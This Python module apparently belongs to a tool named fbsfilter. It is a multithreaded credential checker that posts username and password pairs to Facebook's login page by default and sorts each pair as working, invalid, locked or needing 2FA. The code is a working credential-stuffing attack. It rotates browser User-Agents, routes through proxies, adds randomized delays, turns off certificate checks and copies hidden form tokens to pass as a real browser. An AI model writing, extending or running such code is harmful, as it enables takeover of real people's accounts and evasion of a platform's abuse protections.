"""Credential checker for fbsfilter.

Performs HTTP login attempts and classifies results as:
  working  – credentials accepted
  invalid  – credentials rejected
  locked   – account/IP temporarily blocked or CAPTCHA encountered
  2fa      – valid credentials but 2-factor authentication is required

The checker is designed to be run from multiple threads simultaneously.
"""

import json
import logging
import random
import re
import time
from dataclasses import dataclass, field
from enum import Enum
from typing import Dict, Optional, Tuple

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

logger = logging.getLogger("fbsfilter.checker")


class Status(str, Enum):
    WORKING = "working"
    INVALID = "invalid"
    LOCKED = "locked"
    TWOFA = "2fa"
    ERROR = "error"


@dataclass
class CheckResult:
    username: str
    password: str
    status: Status
    detail: str = ""
    response_url: str = ""
    response_body: str = ""


@dataclass
class TargetConfig:
    url: str = "https://www.facebook.com/login.php"
    username_field: str = "email"
    password_field: str = "pass"
    extra_fields: Dict[str, str] = field(default_factory=dict)
    method: str = "POST"
    success_redirect_contains: str = "facebook.com"
    failure_keyword: str = "incorrect password"
    success_status: Optional[int] = None


# Maximum number of characters captured from a response body for the live viewer.
_MAX_RESPONSE_BODY = 2000

# Pool of realistic User-Agent strings (latest Chrome / Firefox / Edge on Windows)
_USER_AGENTS = [
    # Chrome 124
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    # Chrome 123
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    # Firefox 125
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
    # Firefox 124
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
    # Edge 124
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0",
    # Edge 123
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0",
    # Chrome on macOS
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    # Safari on macOS
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15",
]

# Keywords that indicate a CAPTCHA / rate-limit / lockout response
_LOCK_KEYWORDS = [
    "captcha",
    "security check",
    "unusual activity",
    "temporarily blocked",
    "too many",
    "rate limit",
    "checkpoint",
    "suspicious activity",
    "account has been locked",
    "identity confirmation",
    "verify your account",
    "confirm your identity",
    "we need to verify",
    "please try again",
]

# Keywords that indicate 2-factor authentication is required
_TWOFA_KEYWORDS = [
    "two-factor",
    "two factor",
    "2-factor",
    "2fa",
    "authentication code",
    "verification code",
    "enter the code",
    "enter code",
    "confirm your identity",
    "security code",
    "one-time password",
    "otp",
    "approvals",
    "login approval",
    "check your phone",
    "text message",
]

# Regex patterns to extract hidden form fields from the login page
_HIDDEN_FIELD_RE = re.compile(
    r'<input[^>]+type=["\']hidden["\'][^>]*name=["\']([^"\']+)["\'][^>]*value=["\']([^"\']*)["\']',
    re.IGNORECASE,
)
_HIDDEN_FIELD_RE2 = re.compile(
    r'<input[^>]+name=["\']([^"\']+)["\'][^>]*type=["\']hidden["\'][^>]*value=["\']([^"\']*)["\']',
    re.IGNORECASE,
)


def _extract_hidden_fields(html: str) -> Dict[str, str]:
    """Extract all hidden form input fields from an HTML page."""
    fields: Dict[str, str] = {}
    for pattern in (_HIDDEN_FIELD_RE, _HIDDEN_FIELD_RE2):
        for name, value in pattern.findall(html):
            if name not in fields:
                fields[name] = value
    return fields


class CredentialChecker:
    """Performs a single login attempt and returns a :class:`CheckResult`."""

    def __init__(
        self,
        target: TargetConfig,
        timeout: int = 10,
        retries: int = 2,
        delay: float = 0.5,
        delay_jitter: float = 0.3,
        proxies: Optional[Dict[str, str]] = None,
    ):
        self.target = target
        self.timeout = timeout
        self.retries = retries
        self.delay = delay
        self.delay_jitter = delay_jitter
        self.proxies = proxies

        self._session = requests.Session()
        # Rotate User-Agent per checker instance for diversity across threads
        self._session.headers.update({
            "User-Agent": random.choice(_USER_AGENTS),
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
        })
        self._hidden_fields: Dict[str, str] = {}
        self._prefetch_done = False

    def _prefetch_login_page(self) -> None:
        """GET the login page to obtain cookies and hidden form fields.

        This mimics a real browser opening the page before submitting
        credentials and ensures we send the correct hidden fields (lsd,
        jazoest, etc.) that Facebook requires.
        """
        try:
            resp = self._session.get(
                self.target.url,
                timeout=self.timeout,
                proxies=self.proxies,
                verify=False,
                allow_redirects=True,
            )
            self._hidden_fields = _extract_hidden_fields(resp.text)
            logger.debug("Pre-fetched login page; hidden fields: %s", list(self._hidden_fields.keys()))
        except Exception as exc:
            logger.debug("Pre-fetch failed: %s", exc)
        self._prefetch_done = True

    def check(self, username: str, password: str) -> CheckResult:
        """Attempt login and return a :class:`CheckResult`."""
        # Fetch the login page once per checker instance (per-thread) to
        # obtain cookies and hidden form fields before the first POST.
        if not self._prefetch_done:
            self._prefetch_login_page()

        for attempt in range(1, self.retries + 2):
            try:
                result = self._attempt(username, password)
                if result.status != Status.ERROR:
                    return result
            except (requests.exceptions.ProxyError, requests.exceptions.ConnectionError) as exc:
                logger.debug("Attempt %d failed for %s: %s", attempt, username, exc)
                if attempt > self.retries:
                    return CheckResult(
                        username=username,
                        password=password,
                        status=Status.ERROR,
                        detail=str(exc),
                    )
            except requests.exceptions.Timeout:
                logger.debug("Timeout on attempt %d for %s", attempt, username)
                if attempt > self.retries:
                    return CheckResult(
                        username=username,
                        password=password,
                        status=Status.ERROR,
                        detail="timeout",
                    )
            except requests.exceptions.RequestException as exc:
                logger.debug("Request error on attempt %d for %s: %s", attempt, username, exc)
                if attempt > self.retries:
                    return CheckResult(
                        username=username,
                        password=password,
                        status=Status.ERROR,
                        detail=str(exc),
                    )
            # Apply delay with optional jitter between retries
            actual_delay = self.delay + random.uniform(0, self.delay_jitter)
            if actual_delay > 0:
                time.sleep(actual_delay)

        return CheckResult(username=username, password=password, status=Status.ERROR)

    def _attempt(self, username: str, password: str) -> CheckResult:
        # Start with hidden fields from the pre-fetched page, then override
        # with any explicitly configured extra_fields, and finally set the
        # credential fields so they always take precedence.
        data: Dict[str, str] = {}
        data.update(self._hidden_fields)
        data.update(self.target.extra_fields)
        data[self.target.username_field] = username
        data[self.target.password_field] = password

        kwargs = dict(
            url=self.target.url,
            data=data,
            timeout=self.timeout,
            proxies=self.proxies,
            verify=False,
            allow_redirects=True,
        )

        if self.target.method.upper() == "GET":
            resp = self._session.get(params=data, **{k: v for k, v in kwargs.items() if k != "data"})
        else:
            resp = self._session.post(**kwargs)

        final_url = resp.url.lower()
        body = resp.text.lower()
        raw_body = resp.text[:_MAX_RESPONSE_BODY]

        return self._classify(username, password, resp.status_code, final_url, body, raw_body)

    def _classify(
        self,
        username: str,
        password: str,
        status_code: int,
        final_url: str,
        body: str,
        raw_body: str = "",
    ) -> CheckResult:

        # Locked / CAPTCHA check (highest priority)
        for kw in _LOCK_KEYWORDS:
            if kw in body or kw in final_url:
                return CheckResult(
                    username=username,
                    password=password,
                    status=Status.LOCKED,
                    detail="captcha/lock detected",
                    response_url=final_url,
                    response_body=raw_body,
                )

        # 2FA check
        for kw in _TWOFA_KEYWORDS:
            if kw in body or kw in final_url:
                return CheckResult(
                    username=username,
                    password=password,
                    status=Status.TWOFA,
                    detail="2FA required",
                    response_url=final_url,
                    response_body=raw_body,
                )

        # Specific status code check
        if self.target.success_status and status_code != self.target.success_status:
            return CheckResult(
                username=username,
                password=password,
                status=Status.INVALID,
                detail=f"status {status_code}",
                response_url=final_url,
                response_body=raw_body,
            )

        # Failure keyword check
        if self.target.failure_keyword and self.target.failure_keyword.lower() in body:
            return CheckResult(
                username=username,
                password=password,
                status=Status.INVALID,
                detail="failure keyword matched",
                response_url=final_url,
                response_body=raw_body,
            )

        # Success URL check
        if self.target.success_redirect_contains:
            if self.target.success_redirect_contains.lower() in final_url and \
               "login" not in final_url and \
               "checkpoint" not in final_url:
                return CheckResult(
                    username=username,
                    password=password,
                    status=Status.WORKING,
                    detail="redirect matched",
                    response_url=final_url,
                    response_body=raw_body,
                )

        # Fallback – treat as invalid if we ended up back at the login page
        if "login" in final_url or "signin" in final_url:
            return CheckResult(
                username=username,
                password=password,
                status=Status.INVALID,
                detail="redirected back to login",
                response_url=final_url,
                response_body=raw_body,
            )

        # Default: mark as invalid to avoid false positives
        return CheckResult(
            username=username,
            password=password,
            status=Status.INVALID,
            detail=f"unrecognised response (status={status_code})",
            response_url=final_url,
            response_body=raw_body,
        )

